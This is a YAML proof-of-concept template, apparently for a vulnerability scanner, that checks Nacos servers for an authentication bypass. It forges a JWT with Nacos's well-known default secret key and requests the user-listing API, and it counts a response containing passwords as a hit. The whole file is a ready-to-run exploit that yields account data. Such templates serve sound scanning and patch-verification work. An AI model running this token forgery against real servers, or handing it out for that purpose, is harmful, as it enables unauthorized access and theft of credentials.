id: poc-yaml-nacos-jwt-default-secretKey
info:
  name: Nacos 默认 secret.key 配置不当权限绕过漏洞
  severity: high
  tags:
  - 配置不当
  finger: nacos
variables:
  r_key: hex_encode(base64_decode("SecretKey01234567890123456789012345678901234567890123456789012345678"))
  r_token: gen_jwt("{\"sub\":\"nacos\"}", "HS256", hex_decode(r_key))
requests:
- method: GET
  path: /nacos/v1/auth/users?pageNo=1&pageSize=10&search=accurate
  headers:
    Content-Type: application/x-www-form-urlencoded
    accessToken: '{{.r_token}}'
  expression: 'contains(headers, "json") &&

    contains(body, "pageItems") &&

    contains(body, "password") &&

    !contains(body, "<")

    '
transport: http
